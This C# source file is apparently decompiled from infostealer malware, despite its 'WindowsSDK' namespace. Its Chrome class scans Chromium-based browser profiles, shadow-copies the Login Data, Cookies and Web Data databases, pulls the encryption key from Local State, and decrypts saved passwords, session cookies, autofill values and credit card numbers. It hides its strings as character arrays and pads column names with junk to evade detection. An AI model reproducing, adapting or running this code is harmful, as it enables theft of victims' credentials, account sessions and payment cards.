using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using WindowsSDK.Data.Crypto;
using WindowsSDK.Data.SQLite;
using WindowsSDK.Extensions;
using WindowsSDK.Objects;
using WindowsSDK.Objects.Browsers;
using WindowsSDK.Objects.Serialization;

namespace WindowsSDK.Data.Credentials
{
    public static class Chrome
    {
        public static List<ScannedBrowser> Scan(IList<string> profiles)
        {
            List<ScannedBrowser> list = new List<ScannedBrowser>();
            try
            {
                foreach (string item in profiles.Select((string x) => Environment.ExpandEnvironmentVariables(x)))
                {
                    foreach (string item2 in FileCopier.FindPaths(item, 1, 1, new string(new char[10] { 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a' }), new string(new char[8] { 'W', 'e', 'b', ' ', 'D', 'a', 't', 'a' }), new string(new char[7] { 'C', 'o', 'o', 'k', 'i', 'e', 's' })))
                    {
                        ScannedBrowser scannedBrowser = new ScannedBrowser();
                        string dataFolder = string.Empty;
                        string empty = string.Empty;
                        try
                        {
                            dataFolder = new FileInfo(item2).Directory.FullName;
                            empty = ((!dataFolder.Contains(new string(new char[15]
                            {
                                'O', 'p', 'e', 'r', 'a', ' ', 'G', 'X', ' ', 'S',
                                't', 'a', 'b', 'l', 'e'
                            }))) ? (item2.Contains(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming")) ? GetRoamingName(dataFolder) : GetLocalName(dataFolder)) : new string(new char[8] { 'O', 'p', 'e', 'r', 'a', ' ', 'G', 'X' }));
                            if (!string.IsNullOrEmpty(empty))
                            {
                                empty = empty[0].ToString().ToUpper() + empty.Remove(0, 1);
                                string name = GetName(dataFolder);
                                if (!string.IsNullOrEmpty(name))
                                {
                                    scannedBrowser.BrowserName = empty;
                                    scannedBrowser.BrowserProfile = name;
                                    scannedBrowser.Logins = MakeTries(() => EnumPasswords(dataFolder), (List<Account> x) => x.Count > 0).IsNull();
                                    scannedBrowser.Cookies = MakeTries(() => EnumCook(dataFolder), (List<ScannedCookie> x) => x.Count > 0).IsNull();
                                    scannedBrowser.Autofills = MakeTries(() => EnumFills(dataFolder), (List<Autofill> x) => x.Count > 0).IsNull();
                                    scannedBrowser.CC = MakeTries(() => EnumCC(dataFolder), (List<CC> x) => x.Count > 0).IsNull();
                                }
                            }
                        }
                        catch (Exception)
                        {
                        }
                        if (!scannedBrowser.IsEmpty())
                        {
                            list.Add(scannedBrowser);
                        }
                    }
                }
            }
            catch
            {
            }
            return list;
        }

        private static List<Account> EnumPasswords(string profilePath)
        {
            List<Account> list = new List<Account>();
            try
            {
                string text = Path.Combine(profilePath, new string(new char[10] { 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a' }));
                if (!File.Exists(text))
                {
                    return list;
                }
                string chromeKey = ParseLocalStateKey(profilePath);
                using FileCopier fileCopier = new FileCopier();
                try
                {
                    DataBaseConnection dataBaseConnection = new DataBaseConnection(fileCopier.CreateShadowCopy(text));
                    dataBaseConnection.ReadTable(new string(new char[6] { 'l', 'o', 'g', 'i', 'n', 's' }));
                    for (int i = 0; i < dataBaseConnection.RowLength; i++)
                    {
                        Account account = new Account();
                        try
                        {
                            account.URL = dataBaseConnection.ParseValue(i, 0).Trim();
                            account.Username = dataBaseConnection.ParseValue(i, 3).Trim();
                            account.Password = DecryptChromium(dataBaseConnection.ParseValue(i, 5), chromeKey);
                        }
                        catch (Exception)
                        {
                        }
                        finally
                        {
                            account.URL = (string.IsNullOrWhiteSpace(account.URL) ? "UNKNOWN" : account.URL);
                            account.Username = (string.IsNullOrWhiteSpace(account.Username) ? "UNKNOWN" : account.Username);
                            account.Password = (string.IsNullOrWhiteSpace(account.Password) ? "UNKNOWN" : account.Password);
                        }
                        if (account.Password != "UNKNOWN")
                        {
                            list.Add(account);
                        }
                    }
                }
                catch (Exception)
                {
                }
            }
            catch (Exception)
            {
            }
            return list;
        }

        private static List<ScannedCookie> EnumCook(string profilePath)
        {
            List<ScannedCookie> list = new List<ScannedCookie>();
            try
            {
                string text = Path.Combine(profilePath, new string(new char[7] { 'C', 'o', 'o', 'k', 'i', 'e', 's' }));
                if (!File.Exists(text))
                {
                    return list;
                }
                string chromeKey = ParseLocalStateKey(profilePath);
                using FileCopier fileCopier = new FileCopier();
                try
                {
                    DataBaseConnection dataBaseConnection = new DataBaseConnection(fileCopier.CreateShadowCopy(text));
                    dataBaseConnection.ReadTable(new string(new char[7] { 'c', 'o', 'o', 'k', 'i', 'e', 's' }));
                    for (int i = 0; i < dataBaseConnection.RowLength; i++)
                    {
                        ScannedCookie scannedCookie = null;
                        try
                        {
                            ScannedCookie scannedCookie2 = new ScannedCookie
                            {
                                Host = dataBaseConnection.ParseValue(i, new string(new char[8] { 'h', 'o', 's', 't', '_', 'k', 'e', 'y' })).Trim(),
                                Http = dataBaseConnection.ParseValue(i, new string(new char[8] { 'h', 'o', 's', 't', '_', 'k', 'e', 'y' })).Trim().StartsWith("."),
                                Path = dataBaseConnection.ParseValue(i, new string(new char[4] { 'p', 'a', 't', 'h' })).Trim(),
                                Secure = dataBaseConnection.ParseValue(i, new string(new char[9] { 'i', 's', '_', 's', 'e', 'c', 'u', 'r', 'e' })).Contains("1"),
                                Expires = Convert.ToInt64(dataBaseConnection.ParseValue(i, new string(new char[11]
                            {
                                'e', 'x', 'p', 'i', 'r', 'e', 's', '_', 'u', 't',
                                'c'
                            })).Trim()) / 1000000 - 11644473600L,
                                Name = dataBaseConnection.ParseValue(i, new string(new char[4] { 'n', 'a', 'm', 'e' })).Trim(),
                                Value = DecryptChromium(dataBaseConnection.ParseValue(i, new string(new char[15]
                            {
                                'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_',
                                'v', 'a', 'l', 'u', 'e'
                            })), chromeKey)
                            };
                            scannedCookie = scannedCookie2;
                            if (scannedCookie.Expires < 0)
                            {
                                scannedCookie.Expires = ToUnixTime(DateTime.Now.AddMonths(12));
                            }
                        }
                        catch
                        {
                        }
                        if (scannedCookie != null)
                        {
                            list.Add(scannedCookie);
                        }
                    }
                }
                catch
                {
                }
            }
            catch (Exception)
            {
            }
            return list;
        }

        public static long ToUnixTime(DateTime date)
        {
            DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return Convert.ToInt64((date - dateTime).TotalSeconds);
        }

        private static List<Autofill> EnumFills(string profilePath)
        {
            List<Autofill> list = new List<Autofill>();
            try
            {
                string text = Path.Combine(profilePath, new string(new char[8] { 'W', 'e', 'b', ' ', 'D', 'a', 't', 'a' }));
                if (!File.Exists(text))
                {
                    return list;
                }
                string chromeKey = ParseLocalStateKey(profilePath);
                using FileCopier fileCopier = new FileCopier();
                try
                {
                    DataBaseConnection dataBaseConnection = new DataBaseConnection(fileCopier.CreateShadowCopy(text));
                    dataBaseConnection.ReadTable(new string(new char[8] { 'a', 'u', 't', 'o', 'f', 'i', 'l', 'l' }));
                    for (int i = 0; i < dataBaseConnection.RowLength; i++)
                    {
                        Autofill autofill = null;
                        try
                        {
                            string text2 = dataBaseConnection.ParseValue(i, new string(new char[5] { 'v', 'a', 'l', 'u', 'e' })).Trim();
                            if (text2.StartsWith(new string(new char[3] { 'v', '1', '0' })) || text2.StartsWith(new string(new char[3] { 'v', '1', '1' })))
                            {
                                text2 = DecryptChromium(text2, chromeKey);
                            }
                            Autofill autofill2 = new Autofill
                            {
                                Name = dataBaseConnection.ParseValue(i, new string(new char[4] { 'n', 'a', 'm', 'e' })).Trim(),
                                Value = text2
                            };
                            autofill = autofill2;
                        }
                        catch
                        {
                        }
                        if (autofill != null)
                        {
                            list.Add(autofill);
                        }
                    }
                }
                catch (Exception)
                {
                }
            }
            catch (Exception)
            {
            }
            return list;
        }

        private static List<CC> EnumCC(string profilePath)
        {
            List<CC> list = new List<CC>();
            try
            {
                string text = Path.Combine(profilePath, new string(new char[8] { 'W', 'e', 'b', ' ', 'D', 'a', 't', 'a' }));
                if (!File.Exists(text))
                {
                    return list;
                }
                string chromeKey = ParseLocalStateKey(profilePath);
                using FileCopier fileCopier = new FileCopier();
                try
                {
                    DataBaseConnection dataBaseConnection = new DataBaseConnection(fileCopier.CreateShadowCopy(text));
                    dataBaseConnection.ReadTable(new string(new char[12]
                    {
                        'c', 'r', 'e', 'd', 'i', 't', '_', 'c', 'a', 'r',
                        'd', 's'
                    }));
                    for (int i = 0; i < dataBaseConnection.RowLength; i++)
                    {
                        CC cC = null;
                        try
                        {
                            string number = DecryptChromium(dataBaseConnection.ParseValue(i, new string(new char[21]
                            {
                                'c', 'a', 'r', 'd', '_', 'n', 'u', 'm', 'b', 'e',
                                'r', '_', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e',
                                'd'
                            })), chromeKey).Replace(" ", string.Empty);
                            CC cC2 = new CC
                            {
                                HolderName = dataBaseConnection.ParseValue(i, new string(new char[12]
                            {
                                'n', 'a', 'm', 'e', '_', 'o', 'n', '_', 'c', 'a',
                                'r', 'd'
                            })).Trim(),
                                Month = Convert.ToInt32(dataBaseConnection.ParseValue(i, new string(new char[24]
                            {
                                'e', 'x', 'p', 'i', 'r', 'a', 's', '2', '1', 'a',
                                't', 'i', 'o', 'n', '_', 'm', 'o', 'a', 's', '2',
                                '1', 'n', 't', 'h'
                            }).Replace("as21", string.Empty)).Trim()),
                                Year = Convert.ToInt32(dataBaseConnection.ParseValue(i, new string(new char[23]
                            {
                                'e', 'x', 'p', 'i', 'r', 'a', 'a', 's', '2', '1',
                                't', 'i', 'o', 'n', '_', 'y', 'a', 's', '2', '1',
                                'e', 'a', 'r'
                            }).Replace("as21", string.Empty)).Trim()),
                                Number = number
                            };
                            cC = cC2;
                        }
                        catch
                        {
                        }
                        if (cC != null)
                        {
                            list.Add(cC);
                        }
                    }
                }
                catch
                {
                }
            }
            catch (Exception)
            {
            }
            return list;
        }

        private static string DecryptChromium(string chiperText, string chromeKey)
        {
            string result = string.Empty;
            try
            {
                result = ((chiperText[0] != 'v' || chiperText[1] != '1') ? CryptoHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser).Trim() : CryptoProvider.Decrypt(Convert.FromBase64CharArray(chromeKey.ToArray(), 0, chromeKey.Length), chiperText));
            }
            catch (Exception)
            {
            }
            return result;
        }

        private static string GetName(string path)
        {
            try
            {
                string[] array = path.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                if (array[array.Length - 2].Contains(new string(new char[9] { 'U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a' })))
                {
                    return array[array.Length - 1];
                }
            }
            catch
            {
            }
            return "Unknown";
        }

        private static string GetRoamingName(string path)
        {
            try
            {
                return path.Split(new string[1]
                {
                    new string(new char[16]
                    {
                        'A', 'p', 'p', 'D', 'a', 't', 'a', '\\', 'R', 'o',
                        'a', 'm', 'i', 'n', 'g', '\\'
                    })
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries)[0];
            }
            catch
            {
            }
            return string.Empty;
        }

        private static string GetLocalName(string path)
        {
            try
            {
                string[] array = path.Split(new string[1]
                {
                    new string(new char[14]
                    {
                        'A', 'p', 'p', 'D', 'a', 't', 'a', '\\', 'L', 'o',
                        'c', 'a', 'l', '\\'
                    })
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                return array[0] + "_[" + array[1] + "]";
            }
            catch
            {
            }
            return string.Empty;
        }

        public static T MakeTries<T>(Func<T> func, Func<T, bool> success)
        {
            int num = 1;
            T val = func();
            while (!success(val))
            {
                val = func();
                num++;
                if (num > 2)
                {
                    return val;
                }
            }
            return val;
        }

        private static string ParseLocalStateKey(string profilePath)
        {
            string result = string.Empty;
            string empty = string.Empty;
            try
            {
                string[] array = profilePath.Split(new string[1] { "\\" }, StringSplitOptions.RemoveEmptyEntries);
                array = array.Take(array.Length - 1).ToArray();
                empty = Path.Combine(string.Join("\\", array), "Local State");
                if (!File.Exists(empty))
                {
                    empty = Path.Combine(profilePath, "Local State");
                }
                if (File.Exists(empty))
                {
                    try
                    {
                        using (new FileCopier())
                        {
                            result = File.ReadAllText(empty).FromJSON<LocalState>().os_crypt.encrypted_key;
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch
            {
            }
            return result;
        }
    }
}
